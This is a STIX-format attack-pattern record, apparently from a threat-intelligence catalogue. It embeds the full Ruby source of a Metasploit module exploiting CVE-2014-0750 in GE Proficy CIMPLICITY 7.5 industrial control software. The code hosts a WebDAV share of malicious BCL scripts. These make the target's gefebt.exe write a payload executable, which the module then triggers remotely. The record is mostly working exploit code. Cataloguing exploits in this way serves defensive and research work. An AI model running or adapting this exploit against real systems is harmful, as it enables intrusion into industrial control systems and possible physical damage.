{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c8c845d1-e788-4856-8547-12884ff36c81",
    "created": "2024-08-14T16:39:26.099847Z",
    "modified": "2024-08-14T16:39:26.099852Z",
    "name": "GE Proficy CIMPLICITY gefebt.exe Remote Code Execution",
    "description": " This module abuses the gefebt.exe component in GE Proficy CIMPLICITY, reachable through the CIMPLICIY CimWebServer. The vulnerable component allows to execute remote BCL files in shared resources. An attacker can abuse this behavior to execute a malicious BCL and drop an arbitrary EXE. The last one can be executed remotely through the WebView server. This module has been tested successfully in GE Proficy CIMPLICITY 7.5 with the embedded CimWebServer. This module starts a WebDAV server to provide the malicious BCL files. If the target does not have the WebClient service enabled, an external SMB service is necessary. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/ge_proficy_cimplicity_gefebt.rb",
            "external_id": "ge_proficy_cimplicity_gefebt.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0750"
        },
        {
            "source_name": "reference",
            "url": "http://ics-cert.us-cert.gov/advisories/ICSA-14-023-01"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize\n    super(\n      'Name'          => 'GE Proficy CIMPLICITY gefebt.exe Remote Code Execution',\n      'Description'   => %q{\n        This module abuses the gefebt.exe component in GE Proficy CIMPLICITY, reachable through the\n        CIMPLICIY CimWebServer. The vulnerable component allows to execute remote BCL files in\n        shared resources. An attacker can abuse this behavior to execute a malicious BCL and\n        drop an arbitrary EXE. The last one can be executed remotely through the WebView server.\n        This module has been tested successfully in GE Proficy CIMPLICITY 7.5 with the embedded\n        CimWebServer. This module starts a WebDAV server to provide the malicious BCL files. If\n        the target does not have the WebClient service enabled, an external SMB service is necessary.\n      },\n      'Author'      => [\n        'amisto0x07', # Vulnerability discovery\n        'Z0mb1E', # Vulnerability discovery\n        'juan vazquez' # Metasploit module\n      ],\n      'References'  =>\n        [\n          [ 'CVE', '2014-0750'],\n          [ 'ZDI', '14-015' ],\n          [ 'URL', 'http://ics-cert.us-cert.gov/advisories/ICSA-14-023-01' ]\n        ],\n      'Stance'         => Msf::Exploit::Stance::Aggressive,\n      'Platform'    => 'win',\n      'Targets'     =>\n        [\n          [ 'GE Proficy CIMPLICITY 7.5 (embedded CimWebServer)', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'Privileged'     => true,\n      'DisclosureDate' => 'Jan 23 2014'\n    )\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('URIPATH',   [ true, 'The URI to use (do not change)', '/' ]),\n        OptPort.new('SRVPORT',     [ true, 'The daemon port to listen on (do not change)', 80 ]),\n        OptString.new('UNCPATH',   [ false, 'Override the UNC path to use.' ]),\n        OptBool.new('ONLYMAKE',    [ false, 'Just generate the malicious BCL files for using with an external SMB server.', true ]),\n        OptString.new('TARGETURI', [true, 'The base path to the CimWeb', '/'])\n      ])\n  end\n\n  def on_request_uri(cli, request)\n    case request.method\n      when 'OPTIONS'\n        process_options(cli, request)\n      when 'PROPFIND'\n        process_propfind(cli, request)\n      when 'GET'\n        process_get(cli, request)\n      else\n        vprint_status(\"#{request.method} => 404 (#{request.uri})\")\n        resp = create_response(404, \"Not Found\")\n        resp.body = \"\"\n        resp['Content-Type'] = 'text/html'\n        cli.send_response(resp)\n    end\n  end\n\n  def autofilter\n    true\n  end\n\n  def process_get(cli, request)\n    if request.uri =~ /#{@basename}(\\d)\\.bcl/\n      print_status(\"GET => Payload\")\n      data = @bcls[$1.to_i]\n      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    # Anything else is probably a request for a data file...\n    vprint_status(\"GET => DATA (#{request.uri})\")\n    data = rand_text_alpha(8 + rand(10))\n    send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n  end\n\n  #\n  # OPTIONS requests sent by the WebDav Mini-Redirector\n  #\n  def process_options(cli, request)\n    vprint_status(\"OPTIONS #{request.uri}\")\n    headers = {\n      'MS-Author-Via' => 'DAV',\n      'DASL'          => '<DAV:sql>',\n      'DAV'           => '1, 2',\n      'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',\n      'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',\n      'Cache-Control' => 'private'\n    }\n    resp = create_response(207, \"Multi-Status\")\n    headers.each_pair {|k,v| resp[k] = v }\n    resp.body = \"\"\n    resp['Content-Type'] = 'text/xml'\n    cli.send_response(resp)\n  end\n\n  #\n  # PROPFIND requests sent by the WebDav Mini-Redirector\n  #\n  def process_propfind(cli, request)\n    path = request.uri\n    print_status(\"Received WebDAV PROPFIND request\")\n    body = ''\n\n    if (path =~ /\\.bcl$/i)\n      print_status(\"Sending BCL multistatus for #{path} ...\")\n      body = %Q|<?xml version=\"1.0\"?>\n<a:multistatus xmlns:b=\"urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/\" xmlns:c=\"xml:\" xmlns:a=\"DAV:\">\n<a:response>\n</a:response>\n</a:multistatus>\n|\n    elsif (path =~ /\\/$/) or (not path.sub('/', '').index('/'))\n      # Response for anything else (generally just /)\n      print_status(\"Sending directory multistatus for #{path} ...\")\n      body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype><D:collection/></lp1:resourcetype>\n<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>\n<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>\n<lp1:getetag>\"39e0001-1000-4808c3ec95000\"</lp1:getetag>\n<D:lockdiscovery/>\n<D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n</D:multistatus>\n|\n    else\n      print_status(\"Sending 404 for #{path} ...\")\n      send_not_found(cli)\n      return\n    end\n\n    # send the response\n    resp = create_response(207, \"Multi-Status\")\n    resp.body = body\n    resp['Content-Type'] = 'text/xml'\n    cli.send_response(resp)\n  end\n\n  def check\n    uri = normalize_uri(target_uri.to_s, \"CimWeb\", \"gefebt.exe\")\n    uri << \"?\"\n\n    res = send_request_cgi('uri' => uri)\n\n    # res.to_s is used because the CIMPLICITY embedded web server\n    # doesn't send HTTP compatible responses.\n    if res and res.code == 200 and res.to_s =~ /Usage.*gefebt\\.exe/\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    @extensions = \"bcl\"\n    @bcls= []\n    @total_exe = 0\n\n    setup_resources\n\n    make_bcls\n\n    print_status(\"BCLs available at #{@exploit_unc}#{@share_name}\\\\#{@basename}{i}.bcl\")\n\n    unless datastore['UNCPATH'].blank?\n      @bcls.each_index { |i| file_create(\"#{@basename}#{i}.bcl\", @bcls[i]) }\n      if datastore['ONLYMAKE']\n        print_warning(\"Files created, remember to upload the BCL files to the remote share!\")\n        print_warning(\"Once ready set ONLYMAKE to false\")\n      else\n        exploit_bcl\n      end\n      return\n    end\n\n    super\n  end\n\n  def setup_resources\n    if datastore['UNCPATH'].blank?\n      # Using WebDAV\n      my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address('50.50.50.50') : datastore['SRVHOST']\n      @basename = rand_text_alpha(3)\n      @share_name = rand_text_alpha(3)\n      @exploit_unc  = \"\\\\\\\\#{my_host}\\\\\"\n      @exe_filename = \"#{rand_text_alpha(3 + rand(4))}.exe\"\n      unless datastore['SRVPORT'].to_i == 80 && datastore['URIPATH'] == '/'\n        fail_with(Failure::BadConfig, 'Using WebDAV requires SRVPORT=80 and URIPATH=/')\n      end\n    else\n      # Using external SMB Server\n      if datastore['UNCPATH'] =~ /(\\\\\\\\[^\\\\]*\\\\)([^\\\\]*)\\\\([^\\\\]*)\\.bcl/\n        @exploit_unc = $1\n        @share_name = $2\n        @basename = $3\n        # Use an static file name for the EXE since the module doesn't\n        # deliver the BCL files in this case.\n        @exe_filename = \"ge_pld.exe\"\n      else\n        fail_with(Failure::BadConfig, 'Bad UNCPATH format, should be \\\\\\\\host\\\\shared_folder\\\\base_name.blc')\n      end\n    end\n  end\n\n  def make_bcls\n    exe = generate_payload_exe\n    # Padding to be sure we're aligned to 4 bytes.\n    exe << \"\\x00\" until exe.length % 4 == 0\n    longs = exe.unpack(\"V*\")\n    offset = 0\n\n    # gefebt.exe isn't able to handle (on my test environment) long\n    # arrays bigger than 16000, so we need to split it.\n    while longs.length > 0\n      parts = longs.slice!(0, 16000)\n      @bcls << generate_bcl(parts , offset)\n      offset += parts.length * 4\n    end\n  end\n\n  def generate_bcl(slices, offset)\n    bcl_payload = \"\"\n\n    slices.each_index do |i|\n      bcl_payload << \"s(#{i + 1}) = #{slices[i]}\\n\"\n    end\n\n    <<-EOF\nOption CStrings On\n\nSub Main()\n  Open \"#{@exe_filename}\" For Binary Access Write As #1\n  Dim s(#{slices.length}) As Long\n  #{bcl_payload}\n\n  For x = 1 To #{slices.length}\n    t = x - 1\n    Put #1,t*4+1+#{offset},s(x)\n  Next x\n\n  Close\nEnd Sub\n    EOF\n  end\n\n  def execute_bcl(i)\n    print_status(\"Executing BCL code #{@basename}#{i}.bcl to drop final payload...\")\n\n    uri = normalize_uri(target_uri.to_s, \"CimWeb\", \"gefebt.exe\")\n    uri << \"?#{@exploit_unc}#{@share_name}\\\\#{@basename}#{i}.bcl\"\n\n    res = send_request_cgi('uri' => uri)\n\n    # We use res.to_s because the embedded CIMPLICITY Web server doesn't\n    # answer with valid HTTP responses.\n    if res and res.code == 200 and res.to_s =~ /(^Error.*$)/\n      print_error(\"Server answered with error: $1\")\n      fail_with(Failure::Unknown, \"#{peer} - Server answered with error\")\n    elsif res and res.code == 200 and res.to_s =~ /No such file or directory/\n      fail_with(Failure::BadConfig, \"#{peer} - The target wasn't able to access the remote BCL file\")\n    elsif res and res.code == 200\n      print_good(\"'200 OK' answer indicates success!\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Unknown error\")\n    end\n  end\n\n  def exploit_bcl\n    @bcls.each_index do |i|\n      execute_bcl(i)\n    end\n\n    print_status(\"Executing #{@exe_filename}...\")\n    uri = normalize_uri(target_uri.to_s, \"CimWeb\", @exe_filename)\n    uri << \"?\"\n\n    # Enough timeout to execute the payload, but don't block the exploit\n    # until there is an answer.\n    send_request_cgi({'uri' => uri}, 3)\n  end\n\n  def primer\n    exploit_bcl\n    service.stop\n  end\n\n  def file_create(fname, data)\n    ltype = \"exploit.fileformat.#{self.shortname}\"\n    full_path = store_local(ltype, nil, data, fname)\n    print_good(\"#{fname} stored at #{full_path}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "Jan 23 2014",
    "x_mitre_platforms": [
        "win'"
    ]
}